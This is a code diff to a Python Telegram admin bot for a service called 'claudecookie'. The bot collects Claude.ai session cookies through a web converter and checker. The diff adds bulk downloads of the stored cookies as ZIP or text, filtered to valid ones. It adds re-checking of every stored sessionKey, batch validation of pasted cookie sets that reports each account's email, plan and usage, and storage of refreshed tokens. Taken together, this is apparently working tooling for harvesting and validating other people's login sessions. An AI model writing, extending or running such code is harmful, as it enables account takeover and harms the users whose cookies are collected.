@@ -33,7 +33,23 @@ _HERE = Path(__file__).resolve().parent
 if str(_HERE) not in sys.path:
     sys.path.insert(0, str(_HERE))
 
-from stats_service import migrate_push_settings
+from stats_service import (
+    apply_check_to_event,
+    check_info,
+    execute_check,
+    is_site_sample,
+    migrate_push_settings,
+    resolve_check_country,
+)
+from claude_check import (
+    check_cookie,
+    cookie_oneline,
+    default_country,
+    egress_ok,
+    resolve_country,
+    session_key_hash,
+    split_cookie_sets,
+)
 
 DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
 CONF_PATH = os.environ.get("CC_STATS_CONF", "/etc/claudecookie/bot.conf")
@@ -67,11 +83,13 @@ REASON_LABEL = {
 }
 JSON_FORMATS = ("cookie-editor", "puppeteer", "key-value")
 SPARK = "▁▂▃▄▅▆▇█"
-PERIOD_LABEL = {"d": "за день", "w": "за неделю", "all": "всё время"}
+TG_DOC_MAX = 45 * 1024 * 1024
 TOGGLE_KEYS = frozenset({
     "push_convert", "push_check_valid", "push_check_invalid", "daily_summary",
 })
 WORK = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cc-bot")
+_recheck_guard = threading.Lock()
+_recheck_running = False
 
 
 def log(msg: str) -> None:
@@ -226,17 +244,6 @@ def _has_blob(conn) -> bool:
         "SELECT 1 FROM sqlite_master WHERE type='table' AND name='blobs'"
     ).fetchone()
     return bool(row)
-
-
-def _blob_count(conn, type_: str, extra: str = "", params=()) -> int:
-    if not _has_blob(conn):
-        return 0
-    return scalar(
-        conn,
-        f"SELECT COUNT(*) FROM events e JOIN blobs b ON b.event_id=e.id "
-        f"WHERE e.type=? {extra}",
-        type_, *params,
-    )
 
 
 def view_overview(conn) -> str:
@@ -475,65 +482,60 @@ def view_settings(conn) -> tuple[str, list]:
     return txt, kb
 
 
+def _pipeline_blob_count(conn, valid_only: bool) -> int:
+    if not _has_blob(conn):
+        return 0
+    extra = "AND e.valid=1" if valid_only else ""
+    return scalar(
+        conn,
+        f"SELECT COUNT(*) FROM events e JOIN blobs b ON b.event_id=e.id "
+        f"WHERE e.type IN ('convert','check') {extra}",
+    )
+
+
+def _pipeline_blob_rows(conn, valid_only: bool):
+    extra = "AND e.valid=1" if valid_only else ""
+    return conn.execute(
+        f"SELECT e.id, e.ts, e.type, e.to_fmt, e.valid, b.output FROM events e "
+        f"JOIN blobs b ON b.event_id=e.id "
+        f"WHERE e.type IN ('convert','check') {extra} ORDER BY e.id",
+    ).fetchall()
+
+
 def view_cookies(conn) -> tuple[str, list]:
-    conv = _blob_count(conn, "convert")
-    chk = _blob_count(conn, "check")
+    valid = _pipeline_blob_count(conn, True)
+    total = _pipeline_blob_count(conn, False)
     txt = (
         "<b>📥 Куки</b>\n\n"
-        "Сохранённые наборы куки. Скачиваются ZIP‑архивом — по файлу на набор.\n\n"
-        f"🔄 Из конвертера: <b>{fmt(conv)}</b>\n"
-        f"🔎 Из чекера: <b>{fmt(chk)}</b>"
+        "Один склад: конвертер и проверка логина.\n\n"
+        f"✅ Валидные: <b>{fmt(valid)}</b>\n"
+        f"📦 Все: <b>{fmt(total)}</b>"
     )
     kb = [
-        [{"text": "🔄 Из конвертера", "callback_data": "ck:conv"}],
-        [{"text": "🔎 Из чекера", "callback_data": "ck:chk"}],
+        [{"text": "Скачать валидные", "callback_data": "ck:valid"}],
+        [{"text": "Скачать все", "callback_data": "ck:all"}],
+        [{"text": "Проверить все куки на валид", "callback_data": "ck:recheck"}],
         [{"text": "‹ Назад", "callback_data": "home"}],
     ]
     return txt, kb
 
 
-def view_cookies_convert(conn) -> tuple[str, list]:
-    total = _blob_count(conn, "convert")
+def view_cookies_mode(conn, pile: str) -> tuple[str, list]:
+    valid_only = pile == "valid"
+    n = _pipeline_blob_count(conn, valid_only)
+    title = "Валидные" if valid_only else "Все"
     txt = (
-        "<b>🔄 Куки из конвертера</b>\n\n"
-        f"Доступно наборов: <b>{fmt(total)}</b>\n"
-        "Выбери период для выгрузки в ZIP:"
+        f"<b>📥 {title}</b>\n\n"
+        f"Наборов: <b>{fmt(n)}</b>\n"
+        "Скачать по отдельности (ZIP, файл на набор) или одним файлом "
+        "(одна кука — одна строка)."
     )
     kb = [
-        [{"text": "За день", "callback_data": "dl:conv:d"},
-         {"text": "За неделю", "callback_data": "dl:conv:w"},
-         {"text": "Всё", "callback_data": "dl:conv:all"}],
+        [{"text": "По отдельности", "callback_data": f"dl:{pile}:zip"},
+         {"text": "Одним файлом", "callback_data": f"dl:{pile}:txt"}],
         [{"text": "‹ Назад", "callback_data": "cookies"}],
     ]
     return txt, kb
-
-
-def view_cookies_check(conn) -> tuple[str, list]:
-    ok = _blob_count(conn, "check", "AND e.valid=1")
-    bad = _blob_count(conn, "check", "AND e.valid=0")
-    txt = (
-        "<b>🔎 Куки из чекера</b>\n\n"
-        f"✅ валидных: <b>{fmt(ok)}</b> · ❌ невалидных: <b>{fmt(bad)}</b>\n"
-        "Выбери фильтр и период — придёт ZIP:"
-    )
-    kb = [
-        [{"text": "✅ Валидные · день", "callback_data": "dl:chk:valid:d"},
-         {"text": "неделя", "callback_data": "dl:chk:valid:w"},
-         {"text": "всё", "callback_data": "dl:chk:valid:all"}],
-        [{"text": "❌ Невалид · день", "callback_data": "dl:chk:invalid:d"},
-         {"text": "неделя", "callback_data": "dl:chk:invalid:w"},
-         {"text": "всё", "callback_data": "dl:chk:invalid:all"}],
-        [{"text": "Все · день", "callback_data": "dl:chk:all:d"},
-         {"text": "неделя", "callback_data": "dl:chk:all:w"},
-         {"text": "всё", "callback_data": "dl:chk:all:all"}],
-        [{"text": "‹ Назад", "callback_data": "cookies"}],
-    ]
-    return txt, kb
-
-
-def _cutoff(period: str) -> int:
-    t = int(time.time())
-    return {"d": t - 86400, "w": t - 7 * 86400, "all": 0}.get(period, 0)
 
 
 def _stamp(ts) -> str:
@@ -580,58 +582,130 @@ def _send_zip(chat_id: int, path: str, fname: str, caption: str) -> None:
             pass
 
 
-def download_convert(conn, chat_id: int, period: str) -> str:
+def _zip_entry_name(row) -> str:
+    if row["type"] == "check":
+        return f"check-{row['id']}-{_stamp(row['ts'])}.txt"
+    ext = "json" if row["to_fmt"] in JSON_FORMATS else "txt"
+    return f"convert-{row['id']}-{_stamp(row['ts'])}.{ext}"
+
+
+def _send_txt_or_zip(chat_id: int, fname: str, text: str, caption: str) -> None:
+    data = text.encode("utf-8")
+    if len(data) <= TG_DOC_MAX:
+        send_document(chat_id, fname, data, caption)
+        return
+    rows = [{"output": text}]
+    path, _n = build_zip_file(rows, lambda _r: fname)
+    _send_zip(chat_id, path, fname.replace(".txt", ".zip"), caption)
+
+
+def download_pipeline(conn, chat_id: int, pile: str, mode: str) -> str:
     if not _has_blob(conn):
-        return "Нет данных за период"
-    rows = conn.execute(
-        "SELECT e.id, e.ts, e.to_fmt, b.output FROM events e "
-        "JOIN blobs b ON b.event_id=e.id "
-        "WHERE e.type='convert' AND e.ts>=? ORDER BY e.id",
-        (_cutoff(period),),
-    )
-    path, n = build_zip_file(rows, lambda r: (
-        f"convert-{r['id']}-{_stamp(r['ts'])}."
-        f"{'json' if r['to_fmt'] in JSON_FORMATS else 'txt'}"
-    ))
-    if n == 0:
-        try:
-            os.unlink(path)
-        except OSError:
-            pass
-        return "Нет данных за период"
-    fname = f"converter-cookies-{period}-{_stamp(int(time.time()))}.zip"
-    caption = f"🔄 Куки из конвертера · {PERIOD_LABEL.get(period, period)} · {n} шт."
-    _send_zip(chat_id, path, fname, caption)
+        return "Нет данных"
+    rows = _pipeline_blob_rows(conn, pile == "valid")
+    if not rows:
+        return "Нет данных"
+    label = "валидные" if pile == "valid" else "все"
+    stamp = _stamp(int(time.time()))
+    n = len(rows)
+    caption = f"📥 Куки · {label} · {n} шт."
+    if mode == "zip":
+        path, packed = build_zip_file(rows, _zip_entry_name)
+        if packed == 0:
+            try:
+                os.unlink(path)
+            except OSError:
+                pass
+            return "Нет данных"
+        _send_zip(chat_id, path, f"cookies-{pile}-{stamp}.zip", caption)
+        return f"Отправлено: {packed} шт."
+    lines = [cookie_oneline(r["output"] or "") for r in rows]
+    body = "\n".join(lines)
+    if body:
+        body += "\n"
+    _send_txt_or_zip(chat_id, f"cookies-{pile}-{stamp}.txt", body, caption)
     return f"Отправлено: {n} шт."
 
 
-def download_check(conn, chat_id: int, flt: str, period: str) -> str:
-    if not _has_blob(conn):
-        return "Нет данных за период"
-    where = "e.type='check' AND e.ts>=?"
-    if flt == "valid":
-        where += " AND e.valid=1"
-    elif flt == "invalid":
-        where += " AND e.valid=0"
-    rows = conn.execute(
-        f"SELECT e.id, e.ts, e.valid, b.output FROM events e "
-        f"JOIN blobs b ON b.event_id=e.id WHERE {where} ORDER BY e.id",
-        (_cutoff(period),),
+def recheck_all_stored() -> dict:
+    """Re-check every stored convert/check blob. Updates the same rows.
+
+    The same sessionKey is probed once (force, no 60s cache) and the result is
+    written onto every event that carries it. Pastes without a session key stay
+    as they are (valid NULL) and are not sent to Claude.
+    """
+    conn = db()
+    try:
+        rows = _pipeline_blob_rows(conn, False)
+    finally:
+        conn.close()
+
+    groups: dict[str, list[tuple[int, str]]] = {}
+    skipped = 0
+    for row in rows:
+        raw = row["output"] or ""
+        sid = session_key_hash(raw)
+        if sid is None:
+            skipped += 1
+            continue
+        groups.setdefault(sid, []).append((int(row["id"]), raw))
+
+    valid = 0
+    invalid = 0
+    for sid, items in groups.items():
+        raw = items[-1][1]
+        country = resolve_check_country(sid, None, None)
+        if not egress_ok(country, sid):
+            result = {"ok": False, "invalidReason": "unreachable"}
+        else:
+            result, _cached = execute_check(raw, sid, country, force=True)
+        for event_id, original in items:
+            apply_check_to_event(event_id, original, result)
+        if result.get("ok"):
+            valid += len(items)
+        else:
+            invalid += len(items)
+
+    return {
+        "total": len(rows),
+        "unique": len(groups),
+        "valid": valid,
+        "invalid": invalid,
+        "skipped": skipped,
+    }
+
+
+def _recheck_summary(stats: dict) -> str:
+    return (
+        "🔎 <b>Проверка всех кук</b>\n\n"
+        f"Наборов: <b>{fmt(stats['total'])}</b>"
+        f" · уникальных сессий: <b>{fmt(stats['unique'])}</b>\n"
+        f"✅ валидных: <b>{fmt(stats['valid'])}</b>\n"
+        f"❌ невалидных: <b>{fmt(stats['invalid'])}</b>\n"
+        f"⏭ без sessionKey: <b>{fmt(stats['skipped'])}</b>"
     )
-    path, n = build_zip_file(rows, lambda r: (
-        f"check-{'valid' if r['valid'] == 1 else 'invalid'}-{r['id']}-{_stamp(r['ts'])}.txt"
-    ))
-    if n == 0:
-        try:
-            os.unlink(path)
-        except OSError:
-            pass
-        return "Нет данных за период"
-    flt_label = {"valid": "валидные", "invalid": "невалидные", "all": "все"}.get(flt, flt)
-    fname = f"checker-{flt}-{period}-{_stamp(int(time.time()))}.zip"
-    caption = f"🔎 Куки из чекера · {flt_label} · {PERIOD_LABEL.get(period, period)} · {n} шт."
-    _send_zip(chat_id, path, fname, caption)
-    return f"Отправлено: {n} шт."
+
+
+def _job_recheck_all(chat_id: int) -> None:
+    global _recheck_running
+    with _recheck_guard:
+        if _recheck_running:
+            send(chat_id, "Уже идёт проверка всех кук.")
+            return
+        _recheck_running = True
+    try:
+        send(chat_id, "⏳ Проверяю все сохранённые куки…")
+        stats = recheck_all_stored()
+        if stats["total"] == 0:
+            send(chat_id, "Нет кук для проверки.")
+            return
+        send(chat_id, _recheck_summary(stats))
+    except Exception as e:
+        log(f"recheck all failed: {e!r}")
+        send(chat_id, "Не удалось проверить все куки.")
+    finally:
+        with _recheck_guard:
+            _recheck_running = False
 
 
 HOME_KB = [
@@ -648,7 +722,9 @@ HOME_KB = [
 
 def home_text() -> str:
     return ("<b>🍪 claudecookie · admin</b>\n\n"
-            "Личная статистика конвертера и чекера Claude. Выбери раздел:")
+            "Личная статистика конвертера и чекера Claude. Выбери раздел:\n\n"
+            "<i>💡 Вставь сюда одну куку или пачку (5–10 разных) — проверю все "
+            "и пришлю сводку + ZIP валидных.</i>")
 
 
 def _back():
@@ -674,10 +750,10 @@ def _screen(data: str, conn):
         return view_settings(conn)
     if data == "cookies":
         return view_cookies(conn)
-    if data == "ck:conv":
-        return view_cookies_convert(conn)
-    if data == "ck:chk":
-        return view_cookies_check(conn)
+    if data == "ck:valid":
+        return view_cookies_mode(conn, "valid")
+    if data == "ck:all":
+        return view_cookies_mode(conn, "all")
     return None
 
 
@@ -709,10 +785,7 @@ def _job_screen(data: str, chat_id: int, mid: int) -> None:
 def _job_download(kind: str, chat_id: int, spec: tuple) -> None:
     conn = db()
     try:
-        if kind == "conv":
-            toast = download_convert(conn, chat_id, spec[0])
-        else:
-            toast = download_check(conn, chat_id, spec[0], spec[1])
+        toast = download_pipeline(conn, chat_id, spec[0], spec[1])
         if toast.startswith("Нет"):
             send(chat_id, toast)
     except Exception as e:
@@ -752,6 +825,107 @@ def _job_file(chat_id: int, rid: int) -> None:
         conn.close()
 
 
+def _looks_like_cookies(text: str) -> bool:
+    """Cheap check: does an owner message look like pasted cookies (not chatter)?"""
+    t = text.strip()
+    if not t:
+        return False
+    if "sessionKey" in t or "sessionKeyV3" in t:
+        return True
+    if t[:1] in "[{":
+        return True
+    # A Netscape tab line (>=7 tab fields) or a name=value; header.
+    for line in t.split("\n"):
+        s = line.strip()
+        if s and not s.startswith("#") and len(s.split("\t")) >= 7:
+            return True
+    return False
+
+
+def _store_bot_check(conn, raw: str, res: dict) -> None:
+    """Persist a bot-checked cookie as a `check` event (+ blob), like the web path,
+    so it lands in «📥 Куки» and keep-alive keeps the live token."""
+    ok = bool(res.get("ok"))
+    ts = int(time.time())
+    day = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+    info = json.dumps(check_info(res), ensure_ascii=False) if ok else None
+    stored = res.get("freshCookie") or raw
+    cur = conn.execute(
+        "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
+        "from_fmt,to_fmt,n,domains,output,valid,reason,info) VALUES "
+        "(?,?,'check','bot',NULL,NULL,'bot','/bot',NULL,NULL,1,'claude.ai',NULL,?,?,?)",
+        (ts, day, 1 if ok else 0, None if ok else (res.get("invalidReason") or "invalid"), info),
+    )
+    if stored:
+        conn.execute(
+            "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
+            (int(cur.lastrowid), stored[:512 * 1024]),
+        )
+    conn.commit()
+
+
+def _batch_summary(results: list[tuple[str, dict]]) -> str:
+    ok = sum(1 for _, r in results if r.get("ok"))
+    bad = len(results) - ok
+    lines = [f"🍪 <b>Пакетная проверка</b> · {len(results)} шт · ✅ {ok} / ❌ {bad}\n"]
+    for i, (_, r) in enumerate(results, 1):
+        if r.get("ok"):
+            plan = r.get("planLabel") or "Claude"
+            email = r.get("email") or "—"
+            sess = (r.get("session") or {}).get("percent")
+            week = (r.get("weekly") or {}).get("percent")
+            s = f"{sess}%" if sess is not None else "—"
+            w = f"{week}%" if week is not None else "—"
+            lines.append(f"{i}. ✅ <b>{_html(plan)}</b> · <code>{_html(email)}</code> · 5ч {s} · 7д {w}")
+        else:
+            reason = REASON_LABEL.get(r.get("invalidReason") or "invalid", r.get("invalidReason") or "invalid")
+            lines.append(f"{i}. ❌ {reason}")
+    return "\n".join(lines)
+
+
+def _job_batch_check(chat_id: int, text: str) -> None:
+    """Owner pasted a batch of cookies: split, check each, reply with a summary and
+    a ZIP of the valid (live) ones, and store every set in the DB."""
+    sets = split_cookie_sets(text)
+    if not sets:
+        send(chat_id, "Не нашёл куки в сообщении. Вставь sessionKey / JSON / cookies.txt.")
+        return
+    send(chat_id, f"⏳ Проверяю {len(sets)} шт…")
+    results: list[tuple[str, dict]] = []
+    conn = db()
+    try:
+        for raw in sets:
+            sid = session_key_hash(raw)
+            country = resolve_country(None, None)  # bot has no tz/IP -> neutral supported exit
+            if not egress_ok(country, sid):
+                res = {"ok": False, "invalidReason": "unreachable"}
+            else:
+                res = check_cookie(raw, country=country, session_id=sid)
+                if (not res.get("ok") and res.get("invalidReason") == "unreachable"
+                        and country != default_country()):
+                    res = check_cookie(raw, country=default_country(), session_id=sid)
+            try:
+                _store_bot_check(conn, raw, res)
+            except Exception as e:
+                log(f"bot store check failed: {e!r}")
+            results.append((raw, res))
+    finally:
+        conn.close()
+
+    send(chat_id, _batch_summary(results))
+
+    valid = [(raw, r) for raw, r in results if r.get("ok")]
+    if valid:
+        stamp = _stamp(int(time.time()))
+        rows = [
+            {"output": (r.get("freshCookie") or raw), "i": i}
+            for i, (raw, r) in enumerate(valid, 1)
+        ]
+        path, n = build_zip_file(rows, lambda r: f"valid-{r['i']}-{stamp}.txt")
+        if n:
+            _send_zip(chat_id, path, f"valid-cookies-{stamp}.zip", f"✅ Валидных: {n} шт.")
+
+
 def handle_update(u: dict):
     msg = u.get("message")
     cb = u.get("callback_query")
@@ -767,6 +941,9 @@ def handle_update(u: dict):
             send(OWNER, f"Твой chat_id: <code>{OWNER}</code>")
         elif text.startswith("/diag"):
             send(OWNER, diag_text())
+        elif _looks_like_cookies(text):
+            # Owner pasted cookies (one or a batch): check them all and reply.
+            WORK.submit(_job_batch_check, OWNER, text)
         else:
             send(OWNER, home_text(), HOME_KB)
         return
@@ -780,20 +957,21 @@ def handle_update(u: dict):
         chat_id = cb["message"]["chat"]["id"]
         mid = cb["message"]["message_id"]
         try:
-            if data.startswith("dl:conv:"):
-                period = data.split(":", 2)[2]
-                answer_callback(cb["id"], "Собираю архив…")
-                WORK.submit(_job_download, "conv", chat_id, (period,))
-                return
-            if data.startswith("dl:chk:"):
-                _, _, flt, period = data.split(":", 3)
-                answer_callback(cb["id"], "Собираю архив…")
-                WORK.submit(_job_download, "chk", chat_id, (flt, period))
-                return
+            if data.startswith("dl:"):
+                parts = data.split(":")
+                if (len(parts) == 3 and parts[1] in ("valid", "all")
+                        and parts[2] in ("zip", "txt")):
+                    answer_callback(cb["id"], "Собираю…")
+                    WORK.submit(_job_download, "pipe", chat_id, (parts[1], parts[2]))
+                    return
             if data.startswith("file:"):
                 rid = int(data.split(":", 1)[1])
                 answer_callback(cb["id"], "Отправляю…")
                 WORK.submit(_job_file, chat_id, rid)
+                return
+            if data == "ck:recheck":
+                answer_callback(cb["id"], "Запускаю проверку…")
+                WORK.submit(_job_recheck_all, chat_id)
                 return
             answer_callback(cb["id"])
             WORK.submit(_job_screen, data, chat_id, mid)
@@ -836,6 +1014,10 @@ def should_push_check(valid, get) -> bool:
     return get("push_check_invalid", "1") == "1"
 
 
+def should_push_convert(output) -> bool:
+    return not is_site_sample(output)
+
+
 def push_loop():
     while True:
         try:
@@ -859,13 +1041,18 @@ def _push_kind(conn, type_: str, setting: str, marker: str, sender) -> None:
             set_state(conn, marker, mx)
         return
     rows = conn.execute(
-        "SELECT id, ts, from_fmt, to_fmt, n, country, domains, valid, reason, info "
-        "FROM events WHERE type=? AND id>? ORDER BY id ASC LIMIT 20",
+        "SELECT e.id, e.ts, e.from_fmt, e.to_fmt, e.n, e.country, e.domains, "
+        "e.valid, e.reason, e.info, b.output AS output "
+        "FROM events e LEFT JOIN blobs b ON b.event_id = e.id "
+        "WHERE e.type=? AND e.id>? ORDER BY e.id ASC LIMIT 20",
         (type_, last),
     ).fetchall()
     for r in rows:
         try:
-            sender(r)
+            if type_ == "convert" and not should_push_convert(r["output"]):
+                pass
+            else:
+                sender(r)
         except Exception as e:
             log(f"push {type_} #{r['id']} failed: {e!r}")
         set_state(conn, marker, r["id"])
@@ -898,7 +1085,7 @@ def _push_conversion(r):
          f"{FORMAT_LABEL.get(r['from_fmt'], r['from_fmt'])} → "
          f"{FORMAT_LABEL.get(r['to_fmt'], r['to_fmt'])}\n"
          f"{fmt(r['n'] or 0)} строк · {_html(dom)} · {tm}\n"
-         "<i>Скачать: «📥 Куки → Из конвертера»</i>")
+         "<i>Скачать: «📥 Куки → Скачать все»</i>")
 
 
 def _push_check(r):
@@ -916,7 +1103,7 @@ def _push_check(r):
              f"План: <b>{_html(plan)}</b>\n"
              f"Email: <code>{_html(email)}</code>\n"
              f"5ч: {sess_txt} · 7д: {week_txt} · {tm}\n"
-             "<i>Скачать: «📥 Куки → Из чекера»</i>")
+             "<i>Скачать: «📥 Куки → Скачать валидные»</i>")
     else:
         reason = REASON_LABEL.get(r["reason"] or "invalid", r["reason"] or "invalid")
         send(OWNER,
